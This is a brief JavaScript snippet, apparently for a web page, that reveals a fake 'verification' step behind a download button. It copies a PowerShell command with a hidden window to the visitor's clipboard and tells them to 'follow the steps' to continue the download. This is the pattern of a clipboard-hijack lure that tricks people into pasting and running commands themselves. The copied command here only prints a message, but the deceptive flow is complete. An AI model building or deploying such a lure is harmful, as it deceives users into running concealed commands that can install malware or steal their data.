document.getElementById("downloadBtn").onclick = function(){
    document.getElementById("verification").classList.remove("hidden")
}

document.getElementById("copyBtn").onclick = function(){

let command = "powershell -w hidden Write-Host 'File verification successful'";

navigator.clipboard.writeText(command)

alert("Verification code copied. Follow the steps to continue download.")
}
